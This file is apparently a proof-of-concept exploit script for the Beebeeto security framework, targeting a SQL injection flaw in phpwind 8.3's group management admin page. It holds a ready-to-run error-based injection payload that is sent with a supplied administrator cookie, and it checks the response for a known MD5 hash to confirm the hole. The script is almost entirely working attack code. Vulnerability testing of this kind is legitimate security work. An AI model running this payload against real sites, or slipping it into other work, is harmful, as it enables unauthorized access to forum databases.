#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0197',
            'name': 'phpwind 8.3 /apps/group/admin/manage.php SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-12-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['8.3'],
            'type': 'SQL Injection',
            'tag': ['phpwind漏洞', 'SQL注入漏洞', '/apps/group/admin/manage.php', 'php'],
            'desc': '利用前提是得到群组管理员权限，所以需要传入-c参数cookie',
            'references': ['http://wooyun.org/bugs/wooyun-2011-01549',
            ],
        },
    }


    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-c','--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='this poc need to login, so special cookie '
                                    'for target must be included in http headers.')

    @classmethod
    def verify(cls, args):
        headers_cookie = {"Cookie":args['options']['cookie']}
        payload = ("/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1"
                   "&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid="
                   "a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat"
                   "(floor(rand(0)*2),CONCAT(0x3a,(SELECT md5(233))))a from information_schema.tables group by a)b)%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url, headers=headers_cookie)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            content = urllib2.urlopen(req).read()
        except urllib2.URLError, e:
            content = e.read()
            if 'e165421110ba03099a1c0393373c5b43' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
            return args
        if 'e165421110ba03099a1c0393373c5b43' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())